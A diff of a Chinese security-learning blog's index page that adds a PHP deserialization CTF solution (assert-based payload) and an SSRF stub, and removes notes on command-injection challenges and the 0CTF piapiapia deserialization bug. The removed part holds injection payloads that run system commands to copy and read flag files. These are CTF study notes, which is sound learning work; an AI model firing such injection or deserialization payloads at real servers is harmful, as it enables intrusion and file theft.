@@ -147,6 +147,128 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">反序列化</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-20 22:22:06 / Modified: 23:27:59" itemprop="dateCreated datePublished" datetime="2021-03-20T22:22:06+08:00">2021-03-20</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><img src="/2021/03/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.0.png"></p>
+<p>想法：$b($a)这里可供我们操作。<br>system好像被禁了，用assert（）<br>序列化一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a &#x3D; &quot;phpinfo()&quot;;</span><br><span class="line">        $this-&gt;b &#x3D; &quot;assert&quot;;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new HelloPhp();</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>flag在phpinfo()中，ctrl + F全局搜索读取</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/20/SSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/20/SSRF/" class="post-title-link" itemprop="url">SSRF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-20 21:24:42 / Modified: 22:21:31" itemprop="dateCreated datePublished" datetime="2021-03-20T21:24:42+08:00">2021-03-20</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<hr>
+<h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/19/Namp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -903,248 +1025,6 @@ resource=flag.php</code></pre>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">命令执行</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-03-03 20:50:21" itemprop="dateCreated datePublished" datetime="2021-03-03T20:50:21+08:00">2021-03-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-17 17:09:59" itemprop="dateModified" datetime="2021-03-17T17:09:59+08:00">2021-03-17</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p>php语句最后的分号可用&gt;代替</p>
-<p>?c=system(‘ls’);查目录</p>
-<p>shell命令：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/BaiYiShaoNian/p/4831022.html">https://www.cnblogs.com/BaiYiShaoNian/p/4831022.html</a></p>
-<p>cp命令：复制 </p>
-<ul>
-<li><p>cp a.txt b.txt : 把文件a的内容复制到b文件</p>
-</li>
-<li><p>cp a.txt ./test : 把文件a复制到text目录下</p>
-</li>
-<li><p>cp -a test test2：递归的把目录test下所有文件（包括隐藏的文件）复制到新的目录 test2</p>
-</li>
-</ul>
-<p>把flag.txt内容搞到1.txt中</p>
-<p>?c=system(“cp fla?.txt 1.txt”);</p>
-<p>flag被过滤，用?代替g,(占位符?可代替任意字符)</p>
-<hr>
-<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p>过滤了flag,system和php</p>
-<p>payload:</p>
-<pre><code>?c=`cp fla?.??? 1.txt`</code></pre>
-<p>``反引号在php中和system一样，代表命令执行</p>
-<hr>
-<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img src="/2021/03/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/A%E7%A7%801.0.png" alt="A秀1.0.png"></p>
-<p>eval执行</p>
-<p>在之前的基础上还过滤了空格</p>
-<p>payload:</p>
-<pre><code>?c=eval($_GET[1]);&amp;1=system(&#39;cat flag.php&#39;);</code></pre>
-<p>1逃逸出了eval，不属于c，不接受过滤,也可以将cat用tac代替，则不需查源代码，可直接读取flag</p>
-<hr>
-<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img src="/2021/03/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/A%E7%A7%801.1.png" alt="A秀1.0.png"><br>在之前的基础上主要过滤了分号;左扩号( 反引号，echo等。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/03/buu-piapiapia/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/03/buu-piapiapia/" class="post-title-link" itemprop="url">buu-piapiapia</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-03-03 17:17:25 / Modified: 19:46:49" itemprop="dateCreated datePublished" datetime="2021-03-03T17:17:25+08:00">2021-03-03</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="0CTF-2016-piapiapia1"><a href="#0CTF-2016-piapiapia1" class="headerlink" title="[0CTF 2016]piapiapia1"></a>[0CTF 2016]piapiapia1</h2><p>不是sql注入，扫后台，发现网站源码泄漏（<a target="_blank" rel="noopener" href="http://www.zip)/">www.zip）</a>  </p>
-<hr>
-<p> config.php，里面有个flag变量（判断flag在config.php中，想办法读取）：</p>
-<pre><code>$config[&#39;hostname&#39;] = &#39;127.0.0.1&#39;;
-$config[&#39;username&#39;] = &#39;root&#39;;
-$config[&#39;password&#39;] = &#39;&#39;;
-$config[&#39;database&#39;] = &#39;&#39;;
-$flag = &#39;&#39;;</code></pre>
-<hr>
-<p> profile.php文件:</p>
-<pre><code>&lt;?php
-require_once(&#39;class.php&#39;);//profile.php包含了class.php
-if($_SESSION[&#39;username&#39;] == null) &#123;
-    die(&#39;Login First&#39;);
-&#125;
-$username = $_SESSION[&#39;username&#39;];
-$profile=$user-&gt;show_profile($username);//变量由show_profile()方法传递，由于profile.php包含了class.php，所以在class.php中跟踪该方法
-if($profile  == null) &#123;
-    header(&#39;Location: update.php&#39;);
-&#125;
-else &#123;
-    $profile = unserialize($profile);//对$profile变量进行了反序列化
-    $phone = $profile[&#39;phone&#39;];
-    $email = $profile[&#39;email&#39;];
-    $nickname = $profile[&#39;nickname&#39;];
-    $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));//file_get_contents()(将一个文件读取到一个字符串中)
-?&gt;</code></pre>
-<ul>
-<li>想办法利用file_get_contents()读取config.php文件</li>
-</ul>
-<hr>
-<p>class.php:</p>
-<p>跟踪show_profile()</p>
-<pre><code>public function show_profile($username)
-&#123;
-    $username = parent::filter($username);
-    $where = &quot;username = &#39;$username&#39;&quot;;
-    $object = parent::select($this-&gt;table, $where);
-    return $object-&gt;profile;
-&#125;//对username进行处理，调用了父类filter和select方法</code></pre>
-<p>涉及到的方法如下（class.php）：</p>
-<pre><code>public function select($table, $where, $ret = &#39;*&#39;) &#123;
-    $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;
-    $result = mysql_query($sql, $this-&gt;link);
-    return mysql_fetch_object($result);
-&#125;
-
-public function filter($string) &#123;
-    $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
-    $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;
-    $string = preg_replace($escape, &#39;_&#39;, $string);
-    $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
-    $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;
-    return preg_replace($safe, &#39;hacker&#39;, $string);
-&#125;//替换字符串中的单引号和反斜杠为下划线 ，并且替换多个字符串为hacker。implode函数是表示把数组拼接起来，拼接符是 “|”：</code></pre>
-<hr>
-<p>update.php中反序列化操作:</p>
-<pre><code>$user-&gt;update_profile($username, serialize($profile));</code></pre>
-<p>调用了class.php中user子类的update_profile方法，回到class.php</p>
-<pre><code>public function update_profile($username, $new_profile) &#123;
-    $username = parent::filter($username);
-    $new_profile = parent::filter($new_profile);
-    $where = &quot;username = &#39;$username&#39;&quot;;
-    return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
-&#125;</code></pre>
-<p>又利用了父类中的filter方法，同时还有update方法</p>
-<pre><code>public function update($table, $key, $value, $where) &#123;
-    $sql = &quot;UPDATE $table SET $key = &#39;$value&#39; WHERE $where&quot;;
-    return mysql_query($sql);
-&#125;</code></pre>
-<hr>
-<p>综上：</p>
-<p>unserialize-&gt;show_profile方法-&gt;select方法</p>
-<p>serialize-&gt;update_profile方法-&gt;update方法</p>
-<p>分析：首先数据经过序列化传入到数据库，然后取出的时候反序列化，需要传入参数，并且构造恶意参数，而update.php这个页面我们可以看到是一个数据传入的页面，看看是否存在漏洞</p>
-<pre><code>if(!preg_match(&#39;/^\d&#123;11&#125;$/&#39;, $_POST[&#39;phone&#39;]))
-die(&#39;Invalid phone&#39;);
-
-if(!preg_match(&#39;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#39;, $_POST[&#39;email&#39;]))
-die(&#39;Invalid email&#39;);
-
-if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)
-die(&#39;Invalid nickname&#39;);</code></pre>
-<p>前两个参数好像都没办法绕过，第三个参数好像可以绕过。<br>这里我们可以发现前面的正则时匹配所有字母和数字，也就是nickname是字母和数字的话，就是真，strlen()函数可以使用数组绕过，nickname就完全被我们控制了。</p>
-<p>update.php:</p>
-<pre><code>$profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];
-$profile[&#39;email&#39;] = $_POST[&#39;email&#39;];
-$profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];
-$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);
-$user-&gt;update_profile($username, serialize($profile));</code></pre>
-<p>unserialize(str) 会忽略能够正常序列化的字符串后面的字符串。像这样的一个字符串，我们可以可以不用反序列话，就能知道它反序列化后是什么，因为它是有规律的<br>a:4:{s:5:“phone”;s:11:“11111111111”;s:5:“email”;s:11:“<a href="mailto:&#x31;&#x61;&#x32;&#115;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;">&#x31;&#x61;&#x32;&#115;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;</a>”;s:8:“nickname”;s:3:“123”;s:5:“photo”;s:39:“upload/f3b94e88bd1bd325af6f62828c8785dd”;}<br>a:4指的是由一个数组序列化而来，并且有4个值。如果是对象的话，把a改成了O。然后就是一个键值名，一个变量值：<br>s:5:”phone”;第一个键值名，是string类型的，长度为五，s:11:”11111111111”;第一个变量值，string类型，长度为11.这就是它的规律。如果我们在这个序列化字符串的后面，再加上一些字符，后面的字符是不会被反序列化的<br>————————————————<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102703489">https://blog.csdn.net/weixin_44077544/article/details/102703489</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1214,7 +1094,7 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
